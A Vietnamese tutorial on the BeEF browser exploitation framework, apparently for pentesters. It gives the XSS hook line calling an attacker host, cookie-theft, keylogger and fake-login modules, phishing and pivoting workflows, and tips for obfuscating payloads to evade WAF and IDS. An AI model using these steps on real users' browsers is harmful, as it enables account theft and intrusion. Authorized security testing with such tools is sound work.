1. BeEF (Browser Exploitation Framework) là gì?

    BeEF là framework C2 (command & control) cho tấn công trình duyệt (browser hacking, XSS automation).

    Khi một browser (victim) bị “hook” (bằng payload JS ngắn: <script src=".../hook.js"></script>), attacker có thể điều khiển, exploit, lấy thông tin, điều hướng, chuyển file, pivot trong mạng nội bộ…

    Hỗ trợ 200+ module (hook, steal cookie, keylogger, phishing, portscan nội bộ, fake update, fake login, xã hội, browser exploit, pop-up, reverse shell, send file, ...)

2. Cài đặt BeEF-XSS
A. Kali/Ubuntu/Debian

sudo apt update
sudo apt install beef-xss

    Hoặc bản mới nhất từ Github:

    git clone https://github.com/beefproject/beef.git
    cd beef
    bundle install
    ./beef

B. Chạy BeEF

sudo beef-xss
# Hoặc:
cd beef && ./beef

    Thường mặc định chạy tại:

        Web UI: http://127.0.0.1:3000/ui/panel

        Hook.js payload: http://<IP_attacker>:3000/hook.js

    Đăng nhập (default):

        User: beef

        Pass: beef

3. Quy trình thực chiến BeEF-XSS
A. “Hook” browser victim

    Chèn payload vào nơi XSS có thể thực thi:

    <script src="http://<IP_attacker>:3000/hook.js"></script>

    Nếu thành công, browser của victim sẽ xuất hiện trong dashboard của BeEF.

B. Quản lý các “hooked browser”

    UI BeEF hiện chi tiết từng victim: OS, browser, IP, địa chỉ mạng LAN, plugins, cookie, tab, v.v.

    Có thể rename, gắn tag, nhóm victim để phân loại.

4. Các module mạnh của BeEF
Module	Chức năng thực tế
Get Cookies	Đọc & gửi về cookie của victim
Keylogger	Theo dõi các phím bấm trong trình duyệt
Alert Dialog	Gửi popup, dụ người dùng click, phish cred
Fake Login	Hiện form fake, chiếm tài khoản
Port Scanner	Quét port nội bộ mạng victim (tìm admin panel, router...)
Network Discovery	Xác định topology, mapping network LAN
Phishing/Social	Fake update, fake addon, dụ install mal extension
WebRTC Leak	Lấy IP nội bộ dù victim dùng VPN
Browser Exploit	Sử dụng CVE JS/HTML5, thử RCE/exec code
Clipboard Stealer	Đọc clipboard của victim
Grab Screenshot	Chụp màn hình trình duyệt
Proxy Pivot	Chuyển tiếp request HTTP qua browser victim (bypass firewall)
Auto Redirect	Điều hướng trang web nạn nhân tới URL khác
Send File	Gửi mã độc hoặc payload đến victim (dropper, loader)
Reverse Shell	Nếu browser dính exploit, có thể lên shell hệ thống (hiếm, với trình duyệt cũ/lỗi)
5. Workflow pentest nâng cao với BeEF
A. Automation XSS chain

    Chain XSS stored/reflected/lab/phishing với BeEF để tự động hóa:

        Scan XSS → Insert hook.js → auto collect cred/session/cookie → pivot

    Dùng macro hoặc JS obfuscate để bypass WAF.

B. Phishing, social engineering

    Dùng module Fake Login, Alert, Popup, Fake Update để dụ người dùng nhập tài khoản, update extension, click malware.

    Dùng Auto Redirect để điều hướng nạn nhân về trang phishing ngoài.

C. Network pivot & lateral movement

    Khi “hook” được browser bên trong mạng nội bộ (văn phòng/cty/target):

        Sử dụng Port Scanner, Internal Request, Proxy Pivot để scan các dịch vụ ẩn, move laterally, tấn công các web chỉ nội bộ truy cập.

    Gửi request HTTP tới địa chỉ nội bộ qua browser victim, bypass firewall NAT cực mạnh.

D. Exfiltration

    Dùng module Get Cookie, Keylogger, Clipboard, Screenshot, Send File để lấy thông tin nhạy cảm hoặc tải mã độc lên.

E. Chain với Metasploit, Empire, ngrok, chisel

    Dùng BeEF để lấy session/cookie/token, chain sang reverse shell (spear phishing), dropper loader (macro, file, LNK...), post-exploit.

6. Bypass detection & stealth attack

    Obfuscate payload: encode URL, viết inline JS chain, đổi tên hook.js, chain JS khác.

    Tích hợp SSL/HTTPS: cấu hình HTTPS cho BeEF để tránh cảnh báo Mixed Content, nâng stealth, bypass IDS.

    Chèn payload vào CDN, trusted domain: tận dụng JSONP, Google APIs, Github raw, pastebin...

    Tận dụng Blind XSS: gửi payload lên nhiều endpoint (admin panel, log, chat...) chờ admin click mới hook được.

    Phối hợp cùng Burp, ZAP, ffuf, kxss để enumerate và inject XSS dễ hơn.

7. Automation & scripting BeEF

    RESTful API: BeEF hỗ trợ REST API (token, module control, report) – tích hợp automation (phát hiện XSS, tự động add payload, trigger module, auto-report).

    Script auto brute, auto XSS scan rồi trigger hook.

    Auto collect dữ liệu và lưu log các hành động của victim.

    Viết module custom bằng Ruby (docs có hướng dẫn), tự động hóa phishing/scan đặc biệt.

8. Fix lỗi thường gặp
Lỗi	Cách xử lý
Không hook được browser	Payload không được inject, victim chặn JS, WAF block external JS, sai IP, firewall chặn, phải dùng HTTPS
Victim disconnect nhanh	Browser tự reload, mất session, script chặn, adblock, endpoint timeout
Không lấy được cookie/session	Domain restriction (HttpOnly/Secure), dùng module khác, dụ victim dán vào fake login
Module không chạy	Browser version không support, HTTPS Mixed Content, popup bị chặn, module lỗi
Không scan được nội bộ	Victim không ở trong LAN, JS restrict, port closed
BeEF không chạy	Thiếu Ruby gem, port 3000 bị chiếm, check log, chạy bằng sudo
Giao diện panel lỗi	Clear cache, dùng browser khác, update BeEF
9. So sánh BeEF với các công cụ khác
Tool	Ưu điểm BeEF	Khác biệt
BeEF	Client-side C2, browser hacking, automation module, control nhiều victim, pivot LAN	Không hỗ trợ phishing mass (so với Gophish), chủ yếu tập trung browser XSS
XSS Hunter	Tự động nhận alert XSS, blind XSS, alert real-time	Không control browser, không automation module
Browser Exploit Kits (rIP, exploit kit)	Chuyên drop malware, 0day	Phức tạp, khó deploy, dễ bị AV detect
PhishTool/Gophish	Phishing automation, email, report	Không control browser, không exploit client-side
Burp/ZAP	Tìm và fuzz XSS mạnh, automation scan	Không giữ phiên hook browser, không control victim
10. Tài liệu, link hữu ích

    BeEF Official

    BeEF Github

    Hacktricks XSS

    PayloadAllTheThings – XSS

    BeEF Cheatsheet

    XSS Hunter

    Bug Bounty Notes XSS

Tóm tắt nhanh

    BeEF-XSS: Framework C2 kiểm soát browser mạnh nhất hiện nay, automation khai thác XSS thực chiến, browser hacking, phishing, pivot mạng nội bộ, lấy cookie, keylogger, download/upload, fake login, automation social engineering...

    Nên kết hợp Burp/ZAP/ffuf/kxss để enumerate, XSS Hunter để detect blind, chain với Metasploit/Empire để escalete từ browser sang hệ thống.